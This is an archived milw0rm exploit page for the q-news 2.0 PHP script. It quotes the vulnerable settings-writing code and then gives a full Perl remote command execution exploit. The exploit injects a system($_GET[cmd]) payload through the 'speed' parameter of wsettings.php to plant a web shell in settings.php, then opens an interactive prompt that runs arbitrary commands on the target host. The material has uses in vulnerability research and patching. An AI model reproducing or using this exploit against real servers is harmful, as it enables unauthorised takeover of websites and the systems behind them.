<html><head><title>q-news 2.0 Remote Command Execution Exploit</title></head><pre>##########################################################################

Author = FireShot , Jacopo Vuga.
Mail = fireshot&lt;at&gt;autistici&lt;dot&gt;org

Vulnerability = Remote Command Execution
Software = q-news 2.0
Download =
http://ovh.dl.sourceforge.net/sourceforge/php-box/2.0_nologin.zip

Greets to = Osirys for his friendship and his tips, Myral, str0ke

###########################################################################

[CODE]

&lt;?php
$filename = 'settings.php';
if (is_writable($filename)) {
    if (!$handle = fopen($filename, 'w')) {
         print &quot;Cannot open file ($filename)&quot;;
         exit;
    }
if (!fwrite($handle, &quot;&lt;?php
  \$password = '$password';
  \$font = '$font';
  \$height = '$height';
  \$width = '$width';
  \$direction = '$direction';
  \$speed = '$speed';
  \$bgcolor = '$bgcolor';
  \$txtcolor = '$txtcolor';
  \$txtsize = '$txtsize';
  ?&gt;&quot;)) {
        print &quot;Cannot write to file ($filename)&quot;;
        exit;
    }
    print &quot;Successfully saved settings to file ($filename)&quot;;
    fclose($handle);
                    
} else {
    print &quot;The file $filename is not writable&quot;;
}
?&gt;

[/CODE]


[EXPLOIT]

#!/usr/bin/perl


use HTTP::Request;
use LWP::UserAgent;

my $host  =  $ARGV[0];
my $vuln  =  &quot;/wsettings.php?speed=&quot;;
my $rce   =  &quot;/settings.php?cmd=&quot;;
my $evil  =  &quot;';system(\$_GET[cmd]);\$x = '&quot;;

my $inj_url = $host.$vuln.$evil;
my $rce_url = $host.$rce;

($host) || die &quot; usage= perl $0 site \n&quot;; 

print &quot;------------------------\n&quot;;
print &quot;   Q-News RCE Exploit   \n&quot;;
print &quot;       by FireShot      \n&quot;;
print &quot;------------------------\n\n&quot;;

$response = get($inj_url);
if ($response =~ /Successfully saved settings/) {
    &amp;shell;
}
else {
    print &quot;error \n&quot;;
    exit(0);
}

sub shell {
    print &quot;FireShot-shell: &quot;;
    my $cmd = &lt;STDIN&gt;;
    $cmd !~ /quit/ || die &quot; exit \n&quot;;
    my $url = $rce_url.$cmd;
    my $re = get($url);
    if ($re =~ /(.)/) {
        print $re;
    }
    else {
        print &quot;command unknow \n&quot;;
    }
    &amp;shell;
}

sub get() {
    my $url = $_[0];
    my $req = HTTP::Request-&gt;new(GET =&gt; $url);
    my $agent  = LWP::UserAgent-&gt;new();
    $agent-&gt;timeout(4);
    my $response = $agent-&gt;request($req);
    return $response-&gt;content;
}

[/EXPLOIT]

############################################################################

# milw0rm.com [2009-02-10]</pre></html>